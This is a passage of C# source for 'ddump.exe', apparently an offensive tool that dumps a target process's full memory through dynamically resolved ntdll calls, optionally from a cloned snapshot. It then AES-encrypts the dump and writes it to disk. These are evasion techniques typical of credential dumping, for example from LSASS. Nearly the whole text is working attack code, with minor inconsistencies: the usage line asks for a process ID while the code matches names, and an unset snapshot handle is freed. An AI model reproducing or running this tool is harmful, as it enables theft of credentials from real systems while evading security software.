                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
    }
    public class Xavier
    {
        public static void Main(string[] args)
        {

            if (args.Length != 5)
            {
                Console.WriteLine("Usage: ddump.exe [ProcessId] [key] [iv] [destination] [method: classic / snapshot]");
                Console.WriteLine("Example: ddump.exe 762 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1!' C:\\temp\\poney.bin classic");
                return;
            }

            //Initialize variables
            IntPtr cloneProcess = IntPtr.Zero;
            IntPtr sHandle = IntPtr.Zero;
            IntPtr pHandle = IntPtr.Zero;


            //Setup AES key and IV
            string key = args[1];
            string iv = args[2];

            //Which PID to dump
            string procname = args[0];
            int pid = FindPIDByName(procname);
            if (pid == 0)
            {
                Console.WriteLine($"Process {procname} not found !");
                return;
            }

            //Get a Handle to the process
            pHandle = get_handle(pid);


            if (args[4] == "classic")
            {
                //Generate a minidump
                byte[] dumpBytes = Dump(pHandle, pid);
                //Encrypt the dump
                byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);
                // Write the encrypted data to a file
                File.WriteAllBytes(args[3], encryptedDump);
                return;
            }

            if (args[4] == "snapshot")
            {
                //Create a snapshot
                Snapshot(pHandle, out cloneProcess);

                //Generate a minidump
                byte[] dumpBytes = Dump(cloneProcess, pid);

                //Encrypt the dump
                byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);

                // Write the encrypted data to a file
                File.WriteAllBytes(args[3], encryptedDump);

                //Free the snapshot
                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
                DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
                ntfree(sHandle);

                //Close the cloned handle
                pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtClose");
                DELEGATES.NtClose ntclose = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtClose)) as DELEGATES.NtClose;

                ntclose(cloneProcess);
                return;
            }

            static IntPtr get_handle(int pid)
            {
                IntPtr pHandle = IntPtr.Zero;   

                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtOpenProcess");
                DELEGATES.NtOpenProcess ntopen = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;

                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

                CLIENT_ID ci = new CLIENT_ID
                {
                    UniqueProcess = (IntPtr)pid
                };

                ntopen(ref pHandle, 0x001F0FFF, ref oa, ref ci);
                return pHandle;
            }

            static int FindPIDByName(string procname)
            {
                IntPtr hProcess = IntPtr.Zero;

                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtGetNextProcess");
                DELEGATES.NtGetNextProcess ntgext = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtGetNextProcess)) as DELEGATES.NtGetNextProcess;

                //Iterate through processes
                while (true)
                {
                    NtStatus status = ntgext(hProcess, 0x0400, 0, 0, out hProcess);
                    //If no more processes, quit
                    if (status != NtStatus.Success)
                    {
                        return 0;
                    }

                    //If process matches
                    if (is_process(hProcess, procname))
                    {
                        int bufferlenght = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                        var unique_pid = Marshal.AllocHGlobal(bufferlenght);

                        pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
                        DELEGATES.NtQueryInformationProcess ntqi = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueryInformationProcess)) as DELEGATES.NtQueryInformationProcess;

                        ntqi(hProcess, 0, unique_pid, (ulong)bufferlenght, out IntPtr ReturnLength);

                        var temp = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(unique_pid);
                        var pid = temp.UniquePID;

                        Marshal.FreeHGlobal(unique_pid);
                        return (int)pid;
                    }
                }

                static bool is_process(IntPtr hProcess, string procname)
                {
                    string process_name = null;
                    process_name = get_process_image(hProcess);

                    if (process_name.Contains(procname))
                    {
                        return true;
                    }
                    return false;
                }

                static string get_process_image(IntPtr hProcess)
                {
                    int bufferlenght = 0x200;
                    var process_image = Marshal.AllocHGlobal(bufferlenght);

                    IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
                    DELEGATES.NtQueryInformationProcess ntqi = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueryInformationProcess)) as DELEGATES.NtQueryInformationProcess;

                    ntqi(hProcess, 27, process_image, (ulong)bufferlenght, out IntPtr ReturnLength);
                    var us = Marshal.PtrToStructure<UNICODE_STRING>(process_image);
                    var name = Marshal.PtrToStringUni(us.Buffer, us.Length / 2);

                    Marshal.FreeHGlobal(process_image);
                    return name;
                }
            }

            static byte[] Dump(IntPtr pHandle, int pid)
            {
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (FileStream fs = new FileStream("C:\\Windows\\System32\\somedll.dll", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None, 4096, FileOptions.DeleteOnClose))
                    {
                        IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
                        DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;

                        MDWD(pHandle, pid, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                        fs.Position = 0;
                        fs.CopyTo(memoryStream);
                    }
                    return memoryStream.ToArray();
                }
            }

            static void Snapshot(IntPtr pHandle, out IntPtr cloneProcess)
            {
                IntPtr sHandle = IntPtr.Zero;

                //Create snapshot and get a handle
                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtCaptureSnapshot");
                DELEGATES.PssNtCaptureSnapshot ntsnap = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtCaptureSnapshot)) as DELEGATES.PssNtCaptureSnapshot;

                ntsnap(out sHandle, pHandle, PSS_CAPTURE_VA_CLONE, 0);

                //Query the snapshot and get the cloned handle
                pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtQuerySnapshot");
                DELEGATES.PssNtQuerySnapshot ntquery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtQuerySnapshot)) as DELEGATES.PssNtQuerySnapshot;

                ntquery(sHandle, PSS_QUERY_VA_CLONE_INFORMATION, out cloneProcess, IntPtr.Size);
            }

            static byte[] EncryptBytes(byte[] inputBytes, string key, string iv)
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = ASCIIEncoding.ASCII.GetBytes(key);
                    aesAlg.IV = ASCIIEncoding.ASCII.GetBytes(iv);

                    using (MemoryStream msEncrypt = new MemoryStream())
                    using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
                    using (CryptoStream cryptoStream = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(inputBytes, 0, inputBytes.Length);
                        cryptoStream.FlushFinalBlock();

                        return msEncrypt.ToArray();
                    }
                }
            }
        }
    }
}
